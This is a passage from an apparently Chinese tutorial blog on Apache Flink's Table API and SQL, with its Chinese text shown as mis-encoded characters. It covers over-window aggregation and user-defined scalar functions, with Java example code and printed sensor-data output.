class="string">&quot;a&quot;</span>).orderBy(<span class="string">&quot;porctime&quot;</span>).preceding(<span class="string">&quot;1.minutes&quot;</span>).as(<span class="string">&quot;w&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// æœ‰ç•Œçš„äº‹ä»¶æ—¶é—´Row-count over window (æ—¶é—´å­—æ®µ &quot;rowtime&quot;ï¼Œä¹‹å‰10è¡Œ)</span></span><br><span class="line">.window(Over.partitionBy(<span class="string">&quot;a&quot;</span>).orderBy(<span class="string">&quot;rowtime&quot;</span>).preceding(<span class="string">&quot;10.rows&quot;</span>).as(<span class="string">&quot;w&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// æœ‰ç•Œçš„å¤„ç†æ—¶é—´Row-count over window (æ—¶é—´å­—æ®µ &quot;rowtime&quot;ï¼Œä¹‹å‰10è¡Œ)</span></span><br><span class="line">.window(Over.partitionBy(<span class="string">&quot;a&quot;</span>).orderBy(<span class="string">&quot;proctime&quot;</span>).preceding(<span class="string">&quot;10.rows&quot;</span>).as(<span class="string">&quot;w&quot;</span>))</span><br></pre></td></tr></table></figure><h5 id="SQLä¸­çš„Over-Windows"><a href="#SQLä¸­çš„Over-Windows" class="headerlink" title="SQLä¸­çš„Over Windows"></a>SQLä¸­çš„Over Windows</h5><ul><li>ç”¨ Over åšçª—å£èšåˆæ—¶ï¼Œæ‰€æœ‰èšåˆå¿…é¡»åœ¨åŒä¸€çª—å£ä¸Šå®šä¹‰ï¼Œä¹Ÿå°±æ˜¯è¯´å¿…é¡»æ˜¯ç›¸åŒçš„åˆ†åŒºã€æ’åºå’ŒèŒƒå›´</li><li>ç›®å‰ä»…æ”¯æŒåœ¨å½“å‰è¡ŒèŒƒå›´ä¹‹å‰çš„çª—å£</li><li>ORDER BY å¿…é¡»åœ¨å•ä¸€çš„æ—¶é—´å±æ€§ä¸ŠæŒ‡å®š</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(amount) <span class="keyword">OVER</span> (</span><br><span class="line">  <span class="keyword">PARTITION</span> <span class="keyword">BY</span> <span class="keyword">user</span></span><br><span class="line">  <span class="keyword">ORDER</span> <span class="keyword">BY</span> proctime</span><br><span class="line">  <span class="keyword">ROWS</span> <span class="keyword">BETWEEN</span> <span class="number">2</span> PRECEDING <span class="keyword">AND</span> <span class="keyword">CURRENT</span> <span class="type">ROW</span>)</span><br><span class="line"><span class="keyword">FROM</span> Orders</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> ä¹Ÿå¯ä»¥åšå¤šä¸ªèšåˆ</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(amount) <span class="keyword">OVER</span> w, <span class="built_in">SUM</span>(amount) <span class="keyword">OVER</span> w</span><br><span class="line"><span class="keyword">FROM</span> Orders</span><br><span class="line"><span class="keyword">WINDOW</span> w <span class="keyword">AS</span> (</span><br><span class="line">  <span class="keyword">PARTITION</span> <span class="keyword">BY</span> <span class="keyword">user</span></span><br><span class="line">  <span class="keyword">ORDER</span> <span class="keyword">BY</span> proctime</span><br><span class="line">  <span class="keyword">ROWS</span> <span class="keyword">BETWEEN</span> <span class="number">2</span> PRECEDING <span class="keyword">AND</span> <span class="keyword">CURRENT</span> <span class="type">ROW</span>)</span><br></pre></td></tr></table></figure><h6 id="æµ‹è¯•ä»£ç -10"><a href="#æµ‹è¯•ä»£ç -10" class="headerlink" title="æµ‹è¯•ä»£ç "></a>æµ‹è¯•ä»£ç </h6><p>javaä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.tableapi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.TimeCharacteristic;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Over;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Table;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Tumble;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.bridge.java.StreamTableEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.types.Row;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/4 12:47 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TableTest5_TimeAndWindow</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 1. åˆ›å»ºç¯å¢ƒ</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    StreamTableEnvironment tableEnv = StreamTableEnvironment.create(env);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. è¯»å…¥æ–‡ä»¶æ•°æ®ï¼Œå¾—åˆ°DataStream</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.readTextFile(<span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. è½¬æ¢æˆPOJO</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;)</span><br><span class="line">      .assignTimestampsAndWatermarks(<span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;SensorReading&gt;(Time.seconds(<span class="number">2</span>)) &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(SensorReading element)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. å°†æµè½¬æ¢æˆè¡¨ï¼Œå®šä¹‰æ—¶é—´ç‰¹æ€§</span></span><br><span class="line">    <span class="comment">//        Table dataTable = tableEnv.fromDataStream(dataStream, &quot;id, timestamp as ts, temperature as temp, pt.proctime&quot;);</span></span><br><span class="line">    Table dataTable = tableEnv.fromDataStream(dataStream, <span class="string">&quot;id, timestamp as ts, temperature as temp, rt.rowtime&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//        dataTable.printSchema();</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//        tableEnv.toAppendStream(dataTable,Row.class).print();</span></span><br><span class="line"></span><br><span class="line">    tableEnv.createTemporaryView(<span class="string">&quot;sensor&quot;</span>, dataTable);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. çª—å£æ“ä½œ</span></span><br><span class="line">    <span class="comment">// 5.1 Group Window</span></span><br><span class="line">    <span class="comment">// table API</span></span><br><span class="line">    Table resultTable = dataTable.window(Tumble.over(<span class="string">&quot;10.seconds&quot;</span>).on(<span class="string">&quot;rt&quot;</span>).as(<span class="string">&quot;tw&quot;</span>))</span><br><span class="line">      .groupBy(<span class="string">&quot;id, tw&quot;</span>)</span><br><span class="line">      .select(<span class="string">&quot;id, id.count, temp.avg, tw.end&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// SQL</span></span><br><span class="line">    Table resultSqlTable = tableEnv.sqlQuery(<span class="string">&quot;select id, count(id) as cnt, avg(temp) as avgTemp, tumble_end(rt, interval &#x27;10&#x27; second) &quot;</span> +</span><br><span class="line">                                             <span class="string">&quot;from sensor group by id, tumble(rt, interval &#x27;10&#x27; second)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5.2 Over Window</span></span><br><span class="line">    <span class="comment">// table API</span></span><br><span class="line">    Table overResult = dataTable.window(Over.partitionBy(<span class="string">&quot;id&quot;</span>).orderBy(<span class="string">&quot;rt&quot;</span>).preceding(<span class="string">&quot;2.rows&quot;</span>).as(<span class="string">&quot;ow&quot;</span>))</span><br><span class="line">      .select(<span class="string">&quot;id, rt, id.count over ow, temp.avg over ow&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// SQL</span></span><br><span class="line">    Table overSqlResult = tableEnv.sqlQuery(<span class="string">&quot;select id, rt, count(id) over ow, avg(temp) over ow &quot;</span> +</span><br><span class="line">                                            <span class="string">&quot; from sensor &quot;</span> +</span><br><span class="line">                                            <span class="string">&quot; window ow as (partition by id order by rt rows between 2 preceding and current row)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//        dataTable.printSchema();</span></span><br><span class="line">    <span class="comment">//        tableEnv.toAppendStream(resultTable, Row.class).print(&quot;result&quot;);</span></span><br><span class="line">    <span class="comment">//        tableEnv.toRetractStream(resultSqlTable, Row.class).print(&quot;sql&quot;);</span></span><br><span class="line">    tableEnv.toAppendStream(overResult, Row.class).print(<span class="string">&quot;result&quot;</span>);</span><br><span class="line">    tableEnv.toRetractStream(overSqlResult, Row.class).print(<span class="string">&quot;sql&quot;</span>);</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡º:</p><p><em>å› ä¸º</em><code>_partition by id order by rt rows between 2 preceding and current row_</code><em>ï¼Œæ‰€ä»¥æœ€å2æ¬¡å…³äº</em><code>_sensor_1_</code><em>çš„è¾“å‡ºçš„</em><code>_count(id)_</code><em>éƒ½æ˜¯3,ä½†æ˜¯è®¡ç®—å‡ºæ¥çš„å¹³å‡å€¼ä¸ä¸€æ ·ã€‚ï¼ˆå‰è€…è®¡ç®—å€’æ•°3æ¡sensor_1çš„æ•°æ®ï¼Œåè€…è®¡ç®—æœ€åæœ€æ–°çš„3æ¡sensor_1æ•°æ®çš„å¹³å‡å€¼ï¼‰</em></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_1,2019-01-17T09:43:19,1,35.8</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,2019-01-17T09:43:19,1,35.8)</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_6,2019-01-17T09:43:21,1,15.4</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_6,2019-01-17T09:43:21,1,15.4)</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_7,2019-01-17T09:43:22,1,6.7</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_7,2019-01-17T09:43:22,1,6.7)</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_10,2019-01-17T09:43:25,1,38.1</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_10,2019-01-17T09:43:25,1,38.1)</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_1,2019-01-17T09:43:27,2,36.05</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,2019-01-17T09:43:27,2,36.05)</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,2019-01-17T09:43:29,3,34.96666666666666)</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_1,2019-01-17T09:43:29,3,34.96666666666666</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_1,2019-01-17T09:43:32,3,35.4</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,2019-01-17T09:43:32,3,35.4)</span></span><br></pre></td></tr></table></figure><h3 id="å‡½æ•°-Functions"><a href="#å‡½æ•°-Functions" class="headerlink" title="å‡½æ•°(Functions)"></a>å‡½æ•°(Functions)</h3><blockquote><p><a href="https://blog.csdn.net/qq_40180229/article/details/106482550">Flink-å‡½æ•° | ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼ˆUDFï¼‰æ ‡é‡å‡½æ•° | è¡¨å‡½æ•° | èšåˆå‡½æ•° | è¡¨èšåˆå‡½æ•°</a></p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200601214323293.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=WO55U&originHeight=394&originWidth=703&originalType=binary&ratio=1&status=done&style=none"></p><p><img src="https://img-blog.csdnimg.cn/2020060121433777.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=mcRhZ&originHeight=379&originWidth=694&originalType=binary&ratio=1&status=done&style=none"></p><h4 id="ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°-UDF"><a href="#ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°-UDF" class="headerlink" title="ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°(UDF)"></a>ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°(UDF)</h4><ul><li> ç”¨æˆ·å®šä¹‰å‡½æ•°ï¼ˆUser-defined Functionsï¼ŒUDFï¼‰æ˜¯ä¸€ä¸ªé‡è¦çš„ç‰¹æ€§ï¼Œå®ƒä»¬æ˜¾è‘—åœ°æ‰©å±•äº†æŸ¥è¯¢çš„è¡¨è¾¾èƒ½åŠ›<br><em>ä¸€äº›ç³»ç»Ÿå†…ç½®å‡½æ•°æ— æ³•è§£å†³çš„éœ€æ±‚ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨UDFæ¥è‡ªå®šä¹‰å®ç°</em> </li><li> <strong>åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œç”¨æˆ·å®šä¹‰çš„å‡½æ•°å¿…é¡»å…ˆæ³¨å†Œï¼Œç„¶åæ‰èƒ½åœ¨æŸ¥è¯¢ä¸­ä½¿ç”¨</strong> </li><li> å‡½æ•°é€šè¿‡è°ƒç”¨ <code>registerFunction()</code> æ–¹æ³•åœ¨ TableEnvironment ä¸­æ³¨å†Œã€‚å½“ç”¨æˆ·å®šä¹‰çš„å‡½æ•°è¢«æ³¨å†Œæ—¶ï¼Œå®ƒè¢«æ’å…¥åˆ° TableEnvironment çš„å‡½æ•°ç›®å½•ä¸­ï¼Œè¿™æ ·Table API æˆ– SQL è§£æå™¨å°±å¯ä»¥è¯†åˆ«å¹¶æ­£ç¡®åœ°è§£é‡Šå®ƒ </li></ul><h5 id="æ ‡é‡å‡½æ•°-Scalar-Functions"><a href="#æ ‡é‡å‡½æ•°-Scalar-Functions" class="headerlink" title="æ ‡é‡å‡½æ•°(Scalar Functions)"></a>æ ‡é‡å‡½æ•°(Scalar Functions)</h5><p><strong>Scalar Funcionç±»ä¼¼äºmapï¼Œä¸€å¯¹ä¸€</strong></p><p><strong>Table Functionç±»ä¼¼flatMapï¼Œä¸€å¯¹å¤š</strong></p><hr><ul><li> ç”¨æˆ·å®šä¹‰çš„æ ‡é‡å‡½æ•°ï¼Œå¯ä»¥å°†0ã€1æˆ–å¤šä¸ªæ ‡é‡å€¼ï¼Œæ˜ å°„åˆ°æ–°çš„æ ‡é‡å€¼ </li><li> ä¸ºäº†å®šä¹‰æ ‡é‡å‡½æ•°ï¼Œå¿…é¡»åœ¨ org.apache.flink.table.functions ä¸­æ‰©å±•åŸºç±»Scalar Functionï¼Œå¹¶å®ç°ï¼ˆä¸€ä¸ªæˆ–å¤šä¸ªï¼‰æ±‚å€¼ï¼ˆevalï¼‰æ–¹æ³• </li><li> <strong>æ ‡é‡å‡½æ•°çš„è¡Œä¸ºç”±æ±‚å€¼æ–¹æ³•å†³å®šï¼Œæ±‚å€¼æ–¹æ³•å¿…é¡»publicå…¬å¼€å£°æ˜å¹¶å‘½åä¸º eval</strong>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">HashCode</span> <span class="keyword">extends</span> <span class="title">ScalarFunction</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> factor = <span class="number">13</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">HashCode</span><span class="params">(<span class="keyword">int</span> factor)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.factor = factor;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">eval</span><span class="params">(String id)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> id.hashCode() * <span class="number">13</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h6 id="æµ‹è¯•ä»£ç -11"><a href="#æµ‹è¯•ä»£ç -11" class="headerlink" title="æµ‹è¯•ä»£ç "></a>æµ‹è¯•ä»£ç </h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.tableapi.udf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Table;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.bridge.java.StreamTableEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.functions.ScalarFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.types.Row;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/4 3:28 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UdfTest1_ScalarFunction</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// åˆ›å»ºæ‰§è¡Œç¯å¢ƒ</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    <span class="comment">// å¹¶è¡Œåº¦è®¾ç½®ä¸º1</span></span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ›å»ºTableæ‰§è¡Œç¯å¢ƒ</span></span><br><span class="line">    StreamTableEnvironment tableEnv = StreamTableEnvironment.create(env);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. è¯»å–æ•°æ®</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.readTextFile(<span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. è½¬æ¢æˆPOJO</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. å°†æµè½¬æ¢ä¸ºè¡¨</span></span><br><span class="line">    Table sensorTable = tableEnv.fromDataStream(dataStream, <span class="string">&quot;id,timestamp as ts,temperature&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. è‡ªå®šä¹‰æ ‡é‡å‡½æ•°ï¼Œå®ç°æ±‚idçš„hashå€¼</span></span><br><span class="line">    HashCode hashCode = <span class="keyword">new</span> HashCode(<span class="number">23</span>);</span><br><span class="line">    <span class="comment">// æ³¨å†ŒUDF</span></span><br><span class="line">    tableEnv.registerFunction(<span class="string">&quot;hashCode&quot;</span>, hashCode);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4.1 table API</span></span><br><span class="line">    Table resultTable = sensorTable.select(<span class="string">&quot;id, ts, hashCode(id)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4.2 SQL</span></span><br><span class="line">    tableEnv.createTemporaryView(<span class="string">&quot;sensor&quot;</span>, sensorTable);</span><br><span class="line">    Table resultSqlTable = tableEnv.sqlQuery(<span class="string">&quot;select id, ts, hashCode(id) from sensor&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ‰“å°è¾“å‡º</span></span><br><span class="line">    tableEnv.toAppendStream(resultTable, Row.class).print();</span><br><span class="line">    tableEnv.toAppendStream(resultSqlTable, Row.class).print();</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">HashCode</span> <span class="keyword">extends</span> <span class="title">ScalarFunction</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> factor = <span class="number">13</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HashCode</span><span class="params">(<span class="keyword">int</span> factor)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.factor = factor;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">eval</span><span class="params">(String id)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> id.hashCode() * <span class="number">13</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sensor_1,1547718199,-772373508</span><br><span class="line">sensor_1,1547718199,-772373508</span><br><span class="line">sensor_6,1547718201,-772373443</span><br><span class="line">sensor_6,1547718201,-772373443</span><br><span class="line">sensor_7,1547718202,-772373430</span><br><span class="line">sensor_7,1547718202,-772373430</span><br><span class="line">sensor_10,1547718205,1826225652</span><br><span class="line">sensor_10,1547718205,1826225652</span><br><span class="line">sensor_1,1547718207,-772373508</span><br><span class="line">sensor_1,1547718207,-772373508</span><br><span class="line">sensor_1,1547718209,-772373508</span><br><span class="line">sensor_1,1547718209,-772373508</span><br><span class="line">sensor_1,1547718212,-772373508</span><br><span class="line">sensor_1,1547718212,-772373508</span><br></pre></td></tr></table></figure><h5 id="è¡¨å‡½æ•°-Table-Fcuntions"><a href="#è¡¨å‡½æ•°-Table-Fcuntions" class="headerlink" title="è¡¨å‡½æ•°(Table Fcuntions)"></a>è¡¨å‡½æ•°(Table Fcuntions)</h5><p><strong>Scalar Funcionç±»ä¼¼äºmapï¼Œä¸€å¯¹ä¸€</strong></p><p><strong>Table Functionç±»ä¼¼flatMapï¼Œä¸€å¯¹å¤š</strong></p><hr><ul><li> ç”¨æˆ·å®šä¹‰çš„è¡¨å‡½æ•°ï¼Œä¹Ÿå¯ä»¥å°†0ã€1æˆ–å¤šä¸ªæ 